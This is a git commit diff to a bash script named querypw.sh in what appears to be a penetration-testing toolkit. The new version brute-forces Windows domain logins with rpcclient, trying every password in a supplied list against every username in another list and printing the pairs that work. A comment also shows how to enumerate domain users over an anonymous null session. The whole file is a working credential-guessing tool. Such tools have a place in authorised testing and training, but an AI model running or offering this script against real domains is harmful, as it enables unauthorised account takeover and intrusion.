68973d6ded5843fb3aca19be0efa475a907832d0
alan-mj-lin <55764881+alan-mj-lin@users.noreply.github.com>
2021-03-21 18:25:01 -0400

    User and Password Arguments
    Update to pass in user and password files for ease of use

--- scripts/Pwn/querypw.sh
+++ scripts/Pwn/querypw.sh
@@ -1,12 +1,27 @@
 #!/bin/bash
-				
-# Make bash array user-rids=()
 
-# Change user, password, and domain
-user_rids=( $(rpcclient -U "user%password" -W DOMAIN.COM 10.10.10.1 -c enumdomusers | cut -d" " -f2 | cut -d":" -f2 | tr -d "[" | tr -d "]") )
+# Generate domain-users.txt with the command below:
+# rpcclient -U ""%"" 192.168.1.1 -c enumdomusers | cut -d" " -f1 | cut -d":" -f2 | tr -d "[" | tr -d "]" > domain-users.txt
+# Supply a valid user and password when you have domain-level privilege\
+# Usage ./script.sh domain-users.txt pass.txt
 
-# Change user, password, and domain
-for i in "${user_rids[@]}"
+echo "[*] Starting bruteforce testing..."
+
+users="$1"
+pass="$2"
+
+for u in `cat $users`;
 do
-	rpcclient -U "user%password" -W DOMAIN.COM 10.10.10.1 -c "queryuser $i"
+        for p in `cat $pass`
+        do
+                output=$(rpcclient -W DOMAIN.COM -U $u%$p -c "getusername;quit" 10.11.1.20)
+                filtered=$(echo $output | grep 'Account' > /dev/null)
+                if [ $? = 0 ]; then
+                        echo -n "[*] user: $u - "
+                        echo $output
+                        echo "Password: $p"
+                fi
+        done
 done
+
+echo "[*] Bruteforce finished."
